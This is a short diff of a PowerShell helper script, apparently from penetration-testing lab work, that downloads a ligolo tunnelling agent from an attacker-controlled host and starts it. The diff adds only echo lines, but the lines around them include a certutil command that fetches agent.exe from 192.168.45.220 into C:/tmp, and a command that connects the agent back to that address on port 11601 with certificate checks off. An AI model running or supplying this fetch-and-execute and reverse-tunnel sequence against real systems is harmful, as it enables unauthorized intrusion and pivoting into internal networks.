@@ -19,6 +19,7 @@ Write-Host "Downloading ligolo agent..."
 
 #2. (=======================LOOK HERE AND REPLACE!!!!!!!!!!!!!!!!!!!=======================)
 #certutil -urlcache -f KALIIP_Address/agent.exe C:/tmp/agent.exe
+Write-Host "certutil -urlcache -f http://192.168.45.220/agent.exe C:/tmp/agent.exe"
 certutil -urlcache -f http://192.168.45.220/agent.exe C:/tmp/agent.exe
 
 # Output a message
@@ -67,5 +68,5 @@ Write-Host "Turning on Ligolo Now! Make sure your ligolo has already started in 
 #3. (=======================LOOK HERE AND REPLACE!!!!!!!!!!!!!!!!!!!=======================)
 #Be sure to replace $KALIIP_Address with the actual IPADDRESS
 #C:/tmp/agent.exe -connect $KALIIP_Address:11601 -ignore-cert
-
+Write-Host "C:/tmp/agent.exe -connect 192.168.45.220:11601 -ignore-cert"
 C:/tmp/agent.exe -connect 192.168.45.220:11601 -ignore-cert
